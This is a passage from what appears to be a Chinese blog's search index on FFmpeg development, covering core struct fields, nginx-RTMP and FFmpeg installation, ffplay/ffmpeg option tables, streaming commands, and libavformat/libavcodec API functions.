--\u0026gt; B[AVCodecContext] B --\u0026gt; C[AVCodec] 存数据 AVPacket 主要功能：存储压缩编码数据相关信息，即解码前数据（例如H.264码流） 主要信息： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 int64_t pts;// 显示时间，结合AVStream-\u0026gt;time_base转换成时间戳 int64_t dts;// 解码时间，结合AVStream-\u0026gt;time_base转换成时间戳 int size;//data的大小 int stream_index;//packet在stream的index位置 int flags;//标示，结合AV_PKT_FLAG使用，其中最低为1表示该数据是一个关键帧。 #define AV_PKT_FLAG_KEY 0x0001 //关键帧 #define AV_PKT_FLAG_CORRUPT 0x0002 //损坏的数据 #define AV_PKT_FLAG_DISCARD 0x0004 //丢弃的数据 int side_data_elems;//边缘数据元数个数 int64_t duration;//数据的时长，以所属媒体流的时间基准为单位，未知则值为默认值0 int64_t pos;//数据在流媒体中的位置，未知则值为默认值-1 uint8_t *data;//指向保存压缩数据的指针，这就是AVPacket的实际数据。 AVPacketSideData *side_data;//容器提供的一些附加数据 AVBufferRef *buf;//用来管理data指针引用的数据缓存 AVFrame 主要功能：解码后数据（YUV/RGB像素数据）。AVFrame必须由 av_frame_alloc()分配内存 ，同时必须由av_frame_free()释放，分配内存后能够被多次用来存储不同的数据。 主要信息： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 uint8_t * data [AV_NUM_DATA_POINTERS];//解码后原始数据（对视频来说是YUV，RGB，对音频来说是PCM）。 int linesize[AV_NUM_DATA_POINTERS];//在视频中，表示图片一行数据的大小。 uint8_t **extended_data;//指向数据平面/通道。 int width, height;//一个视频帧的宽度和高度。 int nb_samples;//这个AVFrame中的每个音频通道中包含的音频帧个数。 int format;//表示解码后的数据类型或格式，-1表示未被设置或不能识别的类型。 int key_frame;//是否为关键帧。 enum AVPictureType pict_type;//帧的类型。 AVRational sample_aspect_ratio;//视频帧的宽高比，0表示未知。 int64_t pts;//显示时间戳，表示该什么时候被显示。 int64_t pkt_dts;//从AVPacket中拷贝的值。 int coded_picture_number;//编码帧序号。 int display_picture_number;//显示帧需要。 void *opaque;//用户私有信息。 int repeat_pict;//解码时，每帧图片延迟的时间，extra_delay = repeat_pict / (2*fps)。 int interlaced_frame;//是否是隔行扫描 int sample_rate;//音频的采样率。 uint64_t channel_layout;//音频的布局方式。 ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/ffmpeg-%E4%B8%AD%E5%B8%B8%E7%94%A8%E7%BB%93%E6%9E%84%E4%BD%93/","title":"FFmpeg 中常用结构体"},{"content":"FFmpeg 开发 nginx+RTMP安装配置 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 # nginx源码下载 wget http://nginx.org/download/nginx-1.8.1.tar.gz # rtmp模块下载 git clone https://github.com/arut/nginx-rtmp-module.git tar -zxvf nginx-1.8.1.tar.gz yum install gcc pcre-devel zlib-devel ./configure --add-module=/root/nginx-rtmp-module make make install vim /usr/local/nginx/conf/nginx.conf # RTMP server rtmp { server { listen 1935; #监听的端口 chunk_size 4000; application videotest { #rtmp推流请求路径 live on; } } } gstreamer安装 1 yum install gstreamer* ffmpeg安装 1 2 3 4 5 6 wget https://ffmpeg.org/releases/ffmpeg-snapshot.tar.bz2 tar -jxvf ffmpeg-snapshot.tar.bz2 yum install yasm ./configure --enable-shared --prefix=/usr/local/ffmpeg make make install gstreamer使用 摄像头视频流格式 1 gst-launch-1.0 v4l2src ! \u0026#39;video/x-raw,format=(string)YUY2\u0026#39; ! autovideosink rtmp推流（失真和延时十分严重） 1 gst-launch-1.0 v4l2src ! \u0026#34;video/x-raw,width=352,height=288\u0026#34; ! videoparse width=352 height=288 framerate=30/1 ! x264enc bitrate=1024 ref=4 key-int-max=20 ! video/x-h264,profile=main ! h264parse ! video/x-h264 ! flvmux name=mux ! rtmpsink location=\u0026#39;rtmp://192.168.170.129:1935/videotest/test\u0026#39; FFmpeg参数参考 FFplay参数表 名称 有参数 作用 x Y 强制屏幕宽度 y Y 强制屏幕高度 s Y 强制屏幕大小 fs N 全屏 an N 关闭音频 vn N 关闭视频 ast Y 设置想播放的音频流（需要指定流ID） vst Y 设置想播放的视频流（需要指定流ID） sst Y 设置想播放的字幕流（需要指定流ID） ss Y 从指定位置开始播放，单位是秒 t Y 播放指定时长的视频 nodisp N 无显示屏幕 f Y 强制封装格式 pix_fmt Y 指定像素格式 stats N 显示统计信息 idct Y IDCT算法 ec Y 错误隐藏方法 sync Y 视音频同步方式（type=audio/video/ext） autoexit N 播放完成自动退出 exitonkeydown N 按下按键退出 exitonmousedown N 按下鼠标退出 loop Y 指定循环次数 framedrop N CPU不够的时候丢帧 window_title Y 显示窗口的标题 rdftspeed Y Rdft速度 showmode Y 显示方式(0 = video, 1 = waves, 2 = RDFT) codec Y 强制解码器 FFplay播放时的快捷键 播放视音频文件的时候，可以通过下列按键控制视音频的播放\n按键 作用 q, ESC 退出 f 全屏 p, 空格 暂停 w 显示音频波形 s 逐帧显示 左方向键/右方向键 向后10s/向前10s 上方向键/下方向键 向后1min/向前1min page down/page up 向后10min/向前10min 鼠标点击屏幕 跳转到指定位置（根据鼠标位置相对屏幕的宽度计算） FFmpeg参数详解 a) 通用选项\n参数 功能 -L 许可证 -h 帮助 -fromats 显示可用的格式 -f fmt 强迫采用格式fmt -i filename 输入文件 -y 覆盖输出文件 -t duration 设置纪录时间 hh:mm:ss[.xxx]格式的记录时间也支持 -ss position 搜索到指定的时间 [-]hh:mm:ss[.xxx]的格式也支持 -title string 设置标题 -author string 设置作者 -copyright string 设置版权 -comment string 设置评论 -target type 设置目标文件类型(vcd,svcd,dvd) 所有的格式选项（比特率，编解码以及缓冲区大小）自动设置，只需要输入如下的就可以了：ffmpeg -i myfile.avi -target vcd /tmp/vcd.mpg -hq 激活高质量设置 -itsoffset offset 设置以秒为基准的时间偏移，该选项影响所有后面的输入文件。该偏移被加到输入文件的时戳，定义一个正偏移意味着相应的流被延迟了 offset秒。 [-]hh:mm:ss[.xxx]的格式也支持 b) 视频选项\n-b bitrate 设置比特率，缺省200kb/s -r fps 设置帧频 缺省25 -s size 设置帧大小 格式为WXH 缺省160X128.下面的简写也可以直接使用： Sqcif 128X96 qcif 176X144 cif 252X288 4cif 704X576 -aspect aspect 设置横纵比 4:3 16:9 或 1.3333 1.7777 -croptop size 设置顶部切除带大小 像素单位 -cropbottom size –cropleft size –cropright size -padtop size 设置顶部补齐的大小 像素单位 -padbottom size –padleft size –padright size –padcolor color 设置补齐条颜色(hex,6个16进制的数，红:绿:兰排列，比如 000000代表黑色) -vn 不做视频记录 -bt tolerance 设置视频码率容忍度kbit/s -maxrate bitrate设置最大视频码率容忍度 -minrate bitreate 设置最小视频码率容忍度 -bufsize size 设置码率控制缓冲区大小 -vcodec codec 强制使用codec编解码方式。如果用copy表示原始编解码数据必须被拷贝。 -sameq 使用同样视频质量作为源（VBR） -pass n 选择处理遍数（1或者2）。两遍编码非常有用。第一遍生成统计信息，第二遍生成精确的请求的码率 -passlogfile file 选择两遍的纪录文件名为file\nc)高级视频选项\n-g gop_size 设置图像组大小 -intra 仅适用帧内编码 -qscale q 使用固定的视频量化标度(VBR) -qmin q 最小视频量化标度(VBR) -qmax q 最大视频量化标度(VBR) -qdiff q 量化标度间最大偏差 (VBR) -qblur blur 视频量化标度柔化(VBR) -qcomp compression 视频量化标度压缩(VBR) -rc_init_cplx complexity 一遍编码的初始复杂度 -b_qfactor factor 在p和b帧间的qp因子 -i_qfactor factor 在p和i帧间的qp因子 -b_qoffset offset 在p和b帧间的qp偏差 -i_qoffset offset 在p和i帧间的qp偏差 -rc_eq equation 设置码率控制方程 默认tex^qComp -rc_override override 特定间隔下的速率控制重载 -me method 设置运动估计的方法 可用方法有 zero phods log x1 epzs(缺省) full -dct_algo algo 设置dct的算法 可用的有 0 FF_DCT_AUTO 缺省的DCT 1 FF_DCT_FASTINT 2 FF_DCT_INT 3 FF_DCT_MMX 4 FF_DCT_MLIB 5 FF_DCT_ALTIVEC -idct_algo algo 设置idct算法。可用的有 0 FF_IDCT_AUTO 缺省的IDCT 1 FF_IDCT_INT 2 FF_IDCT_SIMPLE 3 FF_IDCT_SIMPLEMMX 4 FF_IDCT_LIBMPEG2MMX 5 FF_IDCT_PS2 6 FF_IDCT_MLIB 7 FF_IDCT_ARM 8 FF_IDCT_ALTIVEC 9 FF_IDCT_SH4 10 FF_IDCT_SIMPLEARM -er n 设置错误残留为n 1 FF_ER_CAREFULL 缺省 2 FF_ER_COMPLIANT 3 FF_ER_AGGRESSIVE 4 FF_ER_VERY_AGGRESSIVE -ec bit_mask 设置错误掩蔽为bit_mask,该值为如下值的位掩码 1 FF_EC_GUESS_MVS (default=enabled) 2 FF_EC_DEBLOCK (default=enabled) -bf frames 使用frames B 帧，支持mpeg1,mpeg2,mpeg4 -mbd mode 宏块决策 0 FF_MB_DECISION_SIMPLE 使用mb_cmp 1 FF_MB_DECISION_BITS 2 FF_MB_DECISION_RD -4mv 使用4个运动矢量 仅用于mpeg4 -part 使用数据划分 仅用于mpeg4 -bug param 绕过没有被自动监测到编码器的问题 -strict strictness 跟标准的严格性 -aic 使能高级帧内编码 h263+ -umv 使能无限运动矢量 h263+ -deinterlace 不采用交织方法 -interlace 强迫交织法编码仅对mpeg2和mpeg4有效。当你的输入是交织的并且你想要保持交织以最小图像损失的时候采用该选项。可选的方法是不交织，但是损失更大 -psnr 计算压缩帧的psnr -vstats 输出视频编码统计到vstats_hhmmss.log -vhook module 插入视频处理模块 module 包括了模块名和参数，用空格分开\nD)音频选项\n-ab bitrate 设置音频码率 -ar freq 设置音频采样率 -ac channels 设置通道 缺省为1 -an 不使能音频纪录 -acodec codec 使用codec编解码\nE)音频/视频捕获选项\n-vd device 设置视频捕获设备。比如/dev/video0 -vc channel 设置视频捕获通道 DV1394专用 -tvstd standard 设置电视标准 NTSC PAL(SECAM) -dv1394 设置DV1394捕获 -av device 设置音频设备 比如/dev/dsp\nF)高级选项\n-map file:stream 设置输入流映射 -debug 打印特定调试信息 -benchmark 为基准测试加入时间 -hex 倾倒每一个输入包 -bitexact 仅使用位精确算法 用于编解码测试 -ps size 设置包大小，以bits为单位 -re 以本地帧频读数据，主要用于模拟捕获设备 -loop 循环输入流（只工作于图像流，用于ffserver测试）\n使用到的FFmpeg命令 查看视频信息 1 ffmpeg -i video HEVC/H.265 AVC/H.264 播放摄像头视频 1 ffplay -f video4linux2 -framerate 30 -video_size hd720 /dev/video0 -f：强制使用设定的格式解析 video4linux2：（简称V4L2)，是Linux中关于视频设备的内核驱动 -framerate：指定帧率播放 -video_size：设定播放视频尺寸 hd720：720P分辨率 /dev/video0：摄像头，在Linux里允许像读取文件一样读取摄像头数据 将本地摄像头数据用RTMP推流 1 ffmpeg -i /dev/video0 -vcodec libx264 -f flv rtmp://... -i：输入 -f：强迫采用格式fmt flv：被众多新一代视频分享网站所采用，是增长最快、最为广泛的视频传播格式 保存RTSP流到本地文件 1 ffmpeg -i \u0026#34;rtsp://...\u0026#34; -vcodec copy -acodec copy xxx.flv -vcodec copy：vcodec指定视频编码器，copy 指明只拷贝，不做编解码 -acodec copy：acodec指定音频编码器，copy 指明只拷贝，不做编解码 播放RTSP流 1 ffplay -rtsp_transport -max_delay 5000000 tcp rtsp://... -rtsp_transport tcp：ffmpeg默认采用UDP协议。当RTSP采用的是TCP协议时，直接播放就会报错，我们就需要指定协议 -max_delay 5000000：指定最大延时为5000000微秒 RTSP流转RTMP流 1 ffmpeg -rtsp_transport tcp -i \u0026#34;rtsp://...\u0026#34; -vcodec copy -an -f flv rtmp://... Unknown input format: \u0026lsquo;dshow\u0026rsquo; 1 ffmpeg -list_devices true -f dshow -i dummy dshow是Windows DirectShow输入设备，linux无法使用\n输出视频所有信息并以json形式展现 1 ffprobe -i 输入视频路径 -v quiet -print_format json -show_format -show_streams 音视频处理流程 FFmpeg主要结构体 结构体之间的关系 解协议 AVOutputFormat 主要功能：保存了输出格式（MP4、flv等）的信息和一些常规设置。\n主要信息：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 const char *name; const char *long_name;//格式的描述性名称，易于阅读。 enum AVCodecID audio_codec; //默认的音频编解码器 enum AVCodecID video_codec; //默认的视频编解码器 enum AVCodecID subtitle_codec; //默认的字幕编解码器 struct AVOutputFormat *next; int (*write_header)(struct AVFormatContext *); int (*write_packet)(struct AVFormatContext *, AVPacket *pkt);//写一个数据包。 如果在标志中设置AVFMT_ALLOW_FLUSH，则pkt可以为NULL。 int (*write_trailer)(struct AVFormatContext *); int (*interleave_packet)(struct AVFormatContext *, AVPacket *out, AVPacket *in, int flush); int (*control_message)(struct AVFormatContext *s, int type, void *data, size_t data_size);//允许从应用程序向设备发送消息。 int (*write_uncoded_frame)(struct AVFormatContext *, int stream_index, AVFrame **frame, unsigned flags);//写一个未编码的AVFrame。 int (*init)(struct AVFormatContext *);//初始化格式。 可以在此处分配数据，并设置在发送数据包之前需要设置的任何AVFormatContext或AVStream参数。 void (*deinit)(struct AVFormatContext *);//取消初始化格式。 int (*check_bitstream)(struct AVFormatContext *, const AVPacket *pkt);//设置任何必要的比特流过滤，并提取全局头部所需的任何额外数据。 AVFormatContext 主要功能：描述了一个媒体文件或媒体流的构成和基本信息\n主要信息：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 struct AVInputFormat *iformat;//输入数据的封装格式。仅解封装用，由avformat_open_input()设置 struct AVOutputFormat *oformat;//输出数据的封装格式。仅封装用，调用者在avformat_write_header()之前设置 AVIOContext *pb; // I/O上下文 // 解封装：由用户在avformat_open_input()之前设置（然后用户必须手动关闭它）或通过avformat_open_input()设置 // 封装：由用户在avformat_write_header()之前设置。 调用者必须注意关闭/释放IO上下文 unsigned int nb_streams;//AVFormatContext.streams中元素的个数 AVStream **streams;//文件中所有流的列表 char filename[1024];//输入输出文件名 int64_t start_time;//第一帧的位置 int64_t duration;//流的持续时间 int64_t bit_rate;//总流比特率（bit / s），如果不可用则为0。 int64_t probesize;//从输入读取的用于确定输入容器格式的数据的最大大小。仅封装用，由调用者在avformat_open_input()之前设置。 AVDictionary *metadata;//元数据 AVCodec *video_codec;//视频编解码器 AVCodec *audio_codec;//音频编解码器 AVCodec *subtitle_codec;//字母编解码器 AVCodec *data_codec;//数据编解码器 int (*io_open)(struct AVFormatContext *s, AVIOContext **pb, const char *url, int flags, AVDictionary **options);//打开IO stream的回调函数。 void (*io_close)(struct AVFormatContext *s, AVIOContext *pb);//关闭使用AVFormatContext.io_open()打开的流的回调函数 解封装 AVFormatContext 主要功能： 解码 AVStream 主要功能：存储每一个视频/音频流信息 主要信息： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 int index; //在AVFormatContext中的索引，这个数字是自动生成的，可以通过这个数字从AVFormatContext::streams表中索引到该流。 int id;//流的标识，依赖于具体的容器格式。解码：由libavformat设置。编码：由用户设置，如果未设置则由libavformat替换。 AVCodecContext *codec;//指向该流对应的AVCodecContext结构，调用avformat_open_input时生成。 AVRational time_base;//这是表示帧时间戳的基本时间单位（以秒为单位）。该流中媒体数据的pts和dts都将以这个时间基准为粒度。 int64_t start_time;//流的起始时间，以流的时间基准为单位。如需设置，100％确保你设置它的值真的是第一帧的pts。 int64_t duration;//解码：流的持续时间。如果源文件未指定持续时间，但指定了比特率，则将根据比特率和文件大小估计该值。 int64_t nb_frames; //此流中的帧数（如果已知）或0。 enum AVDiscard discard;//选择哪些数据包可以随意丢弃，不需要去demux。 AVRational sample_aspect_ratio;//样本长宽比（如果未知，则为0）。 AVDictionary *metadata;//元数据信息。 AVRational avg_frame_rate;//平均帧速率。解封装：可以在创建流时设置为libavformat，也可以在avformat_find_stream_info（）中设置。封装：可以由调用者在avformat_write_header（）之前设置。 AVPacket attached_pic;//附带的图片。比如说一些MP3，AAC音频文件附带的专辑封面。 int probe_packets;//编解码器用于probe的包的个数。 int codec_info_nb_frames;//在av_find_stream_info（）期间已经解封装的帧数。 int request_probe;//流探测状态，1表示探测完成，0表示没有探测请求，rest 执行探测。 int skip_to_keyframe;//表示应丢弃直到下一个关键帧的所有内容。 int skip_samples;//在从下一个数据包解码的帧开始时要跳过的采样数。 int64_t start_skip_samples;//如果不是0，则应该从流的开始跳过的采样的数目。 int64_t first_discard_sample;//如果不是0，则应该从流中丢弃第一个音频样本。 int64_t pts_reorder_error[MAX_REORDER_DELAY+1]; uint8_t pts_reorder_error_count[MAX_REORDER_DELAY+1];//内部数据，从pts生成dts。 int64_t last_dts_for_order_check; uint8_t dts_ordered; uint8_t dts_misordered;//内部数据，用于分析dts和检测故障mpeg流。 AVRational display_aspect_ratio;//显示宽高比。 AVCodecContext 主要功能：存储该视频/音频流使用解码方式的相关数据 主要信息： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 enum AVMediaType codec_type; //编解码器的类型（视频，音频...）。 const struct AVCodec *codec; //采用的解码器AVCodec（H.264,MPEG2...）。 int64_t bit_rate;//平均比特率。 uint8_t *extradata;//针对特定编码器包含的附加信息（例如对于H.264解码器来说，存储SPS，PPS等）。 int extradata_size; AVRational time_base;//时间的基准单位，根据该参数，可以把PTS转化为实际的时间（单位为秒s）。 编解码延迟。 int delay;//编码：从编码器输入到解码器输出的帧延迟数。解码：除了规范中规定的标准解码器外产生的帧延迟数。 int width, height;//代表宽和高（仅视频）。 int refs;//运动估计参考帧的个数（H.264的话会有多帧，MPEG2这类的一般就没有了）。 int sample_rate; //采样率（仅音频）。 int channels; //声道数（仅音频）。 enum AVSampleFormat sample_fmt; //音频采样格式，编码：由用户设置。解码：由libavcodec设置。 int frame_size;//音频帧中每个声道的采样数。编码：由libavcodec在avcodec_open2（）中设置。 解码：可以由一些解码器设置以指示恒定的帧大小. int frame_number;//帧计数器，由libavcodec设置。解码：从解码器返回的帧的总数。编码：到目前为止传递给编码器的帧的总数。 uint64_t channel_layout;//音频声道布局。编码：由用户设置。解码：由用户设置，可能被libavcodec覆盖。 enum AVAudioServiceType audio_service_type;//音频流传输的服务类型。编码：由用户设置。解码：由libavcodec设置。 AVCodec 主要功能：存储编解码器信息 主要信息： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 const char *name;//编解码器的名字，比较短。在编码器和解码器之间是全局唯一的。 这是用户查找编解码器的主要方式 const char *long_name;//编解码器的名字，全称，比较长 enum AVMediaType type;//指明了类型，是视频，音频，还是字幕 enum AVCodecID id; const AVRational *supported_framerates;//支持的帧率（仅视频） const enum AVPixelFormat *pix_fmts;//支持的像素格式（仅视频） const int *supported_samplerates;//支持的采样率（仅音频） const enum AVSampleFormat *sample_fmts;//支持的采样格式（仅音频） const uint64_t *channel_layouts;//支持的声道数（仅音频） int priv_data_size;//私有数据的大小 void (*init_static_data)(struct AVCodec *codec);//初始化编解码器静态数据，从avcodec_register（）调用 int (*encode2)(AVCodecContext *avctx, AVPacket *avpkt, const AVFrame *frame, int *got_packet_ptr);//将数据编码到AVPacket int (*decode)(AVCodecContext *, void *outdata, int *outdata_size, AVPacket *avpkt);//解码数据到AVPacket int (*close)(AVCodecContext *);//关闭编解码器。 void (*flush)(AVCodecContext *);//刷新缓冲区。当seek时会被调用 关系 graph TD A[AVStream] --\u0026gt; B[AVCodecContext] B --\u0026gt; C[AVCodec] 存数据 AVPacket 主要功能：存储压缩编码数据相关信息，即解码前数据（例如H.264码流） 主要信息： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 int64_t pts;// 显示时间，结合AVStream-\u0026gt;time_base转换成时间戳 int64_t dts;// 解码时间，结合AVStream-\u0026gt;time_base转换成时间戳 int size;//data的大小 int stream_index;//packet在stream的index位置 int flags;//标示，结合AV_PKT_FLAG使用，其中最低为1表示该数据是一个关键帧。 #define AV_PKT_FLAG_KEY 0x0001 //关键帧 #define AV_PKT_FLAG_CORRUPT 0x0002 //损坏的数据 #define AV_PKT_FLAG_DISCARD 0x0004 //丢弃的数据 int side_data_elems;//边缘数据元数个数 int64_t duration;//数据的时长，以所属媒体流的时间基准为单位，未知则值为默认值0 int64_t pos;//数据在流媒体中的位置，未知则值为默认值-1 uint8_t *data;//指向保存压缩数据的指针，这就是AVPacket的实际数据。 AVPacketSideData *side_data;//容器提供的一些附加数据 AVBufferRef *buf;//用来管理data指针引用的数据缓存 AVFrame 主要功能：解码后数据（YUV/RGB像素数据）。AVFrame必须由** av_frame_alloc()分配内存**，同时必须由av_frame_free()释放，分配内存后能够被多次用来存储不同的数据。 主要信息： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 uint8_t * data [AV_NUM_DATA_POINTERS];//解码后原始数据（对视频来说是YUV，RGB，对音频来说是PCM）。 int linesize[AV_NUM_DATA_POINTERS];//在视频中，表示图片一行数据的大小。 uint8_t **extended_data;//指向数据平面/通道。 int width, height;//一个视频帧的宽度和高度。 int nb_samples;//这个AVFrame中的每个音频通道中包含的音频帧个数。 int format;//表示解码后的数据类型或格式，-1表示未被设置或不能识别的类型。 int key_frame;//是否为关键帧。 enum AVPictureType pict_type;//帧的类型。 AVRational sample_aspect_ratio;//视频帧的宽高比，0表示未知。 int64_t pts;//显示时间戳，表示该什么时候被显示。 int64_t pkt_dts;//从AVPacket中拷贝的值。 int coded_picture_number;//编码帧序号。 int display_picture_number;//显示帧需要。 void *opaque;//用户私有信息。 int repeat_pict;//解码时，每帧图片延迟的时间，extra_delay = repeat_pict / (2*fps)。 int interlaced_frame;//是否是隔行扫描 int sample_rate;//音频的采样率。 uint64_t channel_layout;//音频的布局方式。 常用函数 av_register_all() 功能：该函数在所有基于ffmpeg的应用程序中几乎都是第一个被调用的。只有调用了该函数，才能使用复用器，编码器等。\navformat_network_init() 功能：使用ffmpeg类库进行开发时，打开流媒体（或本地文件）的函数是 avformat_open_input()；\n其中打开网络流的话，需要在前面调用函数 avformat_network_init()。\navformat_open_input() 功能：打开多媒体数据并且获得一些相关的信息\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 /** * Open an input stream and read the header. The codecs are not opened. * The stream must be closed with avformat_close_input(). * * @param ps Pointer to user-supplied AVFormatContext (allocated by avformat_alloc_context). * May be a pointer to NULL, in which case an AVFormatContext is allocated by this * function and written into ps. * Note that a user-supplied AVFormatContext will be freed on failure. * @param url URL of the stream to open. * @param fmt If non-NULL, this parameter forces a specific input format. * Otherwise the format is autodetected. * @param options A dictionary filled with AVFormatContext and demuxer-private options. * On return this parameter will be destroyed and replaced with a dict containing * options that were not found. May be NULL. * * @return 0 on success, a negative AVERROR on failure. * * @note If you want to use custom IO, preallocate the format context and set its pb field. */ int avformat_open_input(AVFormatContext **ps, const char *url, ff_const59 AVInputFormat *fmt, AVDictionary **options); 参数：\nps：函数调用成功之后处理过的AVFormatContext结构体；\nurl：打开的视音频流的URL；\nfmt：强制指定AVFormatContext中AVInputFormat的。这个参数一般情况下可以设置为NULL，这样FFmpeg可以自动检测AVInputFormat；\noptions：附加的一些选项，一般情况下可以设置为NULL\n返回值：\n执行成功的话，其返回值大于等于0\navformat_find_stream_info() 功能：读取一部分视音频数据并且获得一些相关的信息\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 /** * Read packets of a media file to get stream information. This * is useful for file formats with no headers such as MPEG. This * function also computes the real framerate in case of MPEG-2 repeat * frame mode. * The logical file position is not changed by this function; * examined packets may be buffered for later processing. * * @param ic media file handle * @param options If non-NULL, an ic.nb_streams long array of pointers to * dictionaries, where i-th member contains options for * codec corresponding to i-th stream. * On return each dictionary will be filled with options that were not found. * @return \u0026gt;=0 if OK, AVERROR_xxx on error * * @note this function isn\u0026#39;t guaranteed to open all the codecs, so * options being non-empty at return is a perfectly normal behavior. * * @todo Let the user decide somehow what information is needed so that * we do not waste time getting stuff the user does not need. */ int avformat_find_stream_info(AVFormatContext *ic, AVDictionary **options); 参数：\nic：输入的AVFormatContext；\noptions：配置和定义播放器的参数\n返回值：函数正常执行后返回值大于等于0\n在一些格式当中没有头部信息(flv、h264)，此时调用avformat_open_input()在打开文件无法获取到里面的信息。此时就可以调用此函数，该函数会尝试去探测文件的格式，如果格式当中没有头部信息，它只能获取到编码、宽高等信息，无法获得总时长。如果无法获取到总时长，则需要把整个文件读一遍，计算一下它的总帧数：\n1 2 3 if (avformat_find_stream_info(ic, 0) \u0026gt;=0 ) { LOGI(\u0026#34;duration is: %lld, nb_stream is: %d\u0026#34;, ic-\u0026gt;duration, ic-\u0026gt;nb_streams); } av_dump_format() 功能：打印视频流的信息\n1 2 3 4 5 6 7 8 9 10 11 /** * Print detailed information about the input or output format, such as * duration, bitrate, streams, container, programs, metadata, side data, * codec and time base. * * @param ic the context to analyze * @param index index of the stream to dump information about * @param url the URL to print, such as source or destination file * @param is_output Select whether the specified context is an input(0) or output(1) */ void av_dump_format(AVFormatContext *ic, int index, const char *url, int is_output); 参数：\nic：要分析的上下文\nindex：要转储有关信息的流的索引\nurl：要打印的URL，例如源文件或目标文件\nis_output：选择指定的上下文是输入（0）还是输出（1）\navformat_alloc_output_context2() **功能：**初始化一个用于输出的AVFormatContext结构体\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 /** * Allocate an AVFormatContext for an output format. * avformat_free_context() can be used to free the context and * everything allocated by the framework within it. * * @param *ctx is set to the created format context, or to NULL in * case of failure * @param oformat format to use for allocating the context, if NULL * format_name and filename are used instead * @param format_name the name of output format to use for allocating the * context, if NULL filename is used instead * @param filename the name of the filename to use for allocating the * context, may be NULL * @return \u0026gt;= 0 in case of success, a negative AVERROR code in case of * failure */ int avformat_alloc_output_context2(AVFormatContext **ctx, ff_const59 AVOutputFormat *oformat, const char *format_name, const char *filename); 参数：\nctx：函数调用成功之后创建的AVFormatContext结构体\noformat：指定AVFormatContext中的AVOutputFormat，用于确定输出格式。如果指定为NULL，可以设定后两个参数（format_name或者filename）由FFmpeg猜测输出格式PS：使用该参数需要自己手动获AVOutputFormat，相对于使用后两个参数来说要麻烦一些\nformat_name：指定输出格式的名称。根据格式名称，FFmpeg会推测输出格式。输出格式可以是“flv”，“mkv”等等\nfilename：指定输出文件的名称。根据文件名称，FFmpeg会推测输出格式。文件名称可以是“xx.flv”，“yy.mkv”等等\n返回值：\n函数执行成功的话，其返回值大于等于0\navformat_new_stream() **功能：**在 AVFormatContext 里创建 AVStream 通道，即为文件添加音视频流\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 /** * Add a new stream to a media file. * * When demuxing, it is called by the demuxer in read_header(). If the * flag AVFMTCTX_NOHEADER is set in s.ctx_flags, then it may also * be called in read_packet(). * * When muxing, should be called by the user before avformat_write_header(). * * User is required to call avcodec_close() and avformat_free_context() to * clean up the allocation by avformat_new_stream(). * * @param s media file handle * @param c If non-NULL, the AVCodecContext corresponding to the new stream * will be initialized to use this codec. This is needed for e.g. codec-specific * defaults to be set, so codec should be provided if it is known. * * @return newly created stream or NULL on error. */ AVStream *avformat_new_stream(AVFormatContext *s, const AVCodec *c); 参数：\ns：视频流上下文\nc：如果非空，则与新流对应的AVCodecContext将被初始化以使用此编解码器。因此如果编解码器已知，则应提供编解码器。\n返回值：\n正常执行则返回新创建的流，出错时返回空\navcodec_copy_context() **功能：**拷贝输入视频码流的AVCodecContex的数值到输出视频的AVCodecContext\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 /** * Copy the settings of the source AVCodecContext into the destination * AVCodecContext. The resulting destination codec context will be * unopened, i.e. you are required to call avcodec_open2() before you * can use this AVCodecContext to decode/encode video/audio data. * * @param dest target codec context, should be initialized with * avcodec_alloc_context3(NULL), but otherwise uninitialized * @param src source codec context * @return AVERROR() on error (e.g. memory allocation error), 0 on success * * @deprecated The semantics of this function are ill-defined and it should not * be used. If you need to transfer the stream parameters from one codec context * to another, use an intermediate AVCodecParameters instance and the * avcodec_parameters_from_context() / avcodec_parameters_to_context() * functions. */ attribute_deprecated int avcodec_copy_context(AVCodecContext *dest, const AVCodecContext *src); 参数：\ndest：目标编解码器上下文\nsrc：源编解码器上下文\n返回值：\n成功时返回0\n新版本中FFmpeg的avcodec_copy_context被avcodec_parameters_to_context和avcodec_parameters_from_context所替代，因此需要将原本的写法修改一下：\n旧版API：\n1 2 3 4 5 6 7 8 9 ret = avcodec_copy_context(out_stream-\u0026gt;codec, in_stream-\u0026gt;codec); if (ret \u0026lt; 0){ printf(\u0026#34;Failed to copy context from input to output stream codec context\\n\u0026#34;); goto end; } out_stream-\u0026gt;codec-\u0026gt;codec_tag = 0; if (ofmt_ctx-\u0026gt;oformat-\u0026gt;flags \u0026amp; AVFMT_GLOBALHEADER) out_stream-\u0026gt;codec-\u0026gt;flags |= AV_CODEC_FLAG_GLOBAL_HEADER; 新版API：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 AVCodecContext *codec_ctx = avcodec_alloc_context3(in_codec); ret = avcodec_parameters_to_context(codec_ctx, in_stream-\u0026gt;codecpar); if (ret \u0026lt; 0){ printf(\u0026#34;Failed to copy in_stream codecpar to codec context\\n\u0026#34;); goto end; } codec_ctx-\u0026gt;codec_tag = 0; if (ofmt_ctx-\u0026gt;oformat-\u0026gt;flags \u0026amp; AVFMT_GLOBALHEADER) codec_ctx-\u0026gt;flags |= AV_CODEC_FLAG_GLOBAL_HEADER; ret = avcodec_parameters_from_context(out_stream-\u0026gt;codecpar, codec_ctx); if (ret \u0026lt; 0){ printf(\u0026#34;Failed to copy codec context to out_stream codecpar context\\n\u0026#34;); goto end; } avio_open() 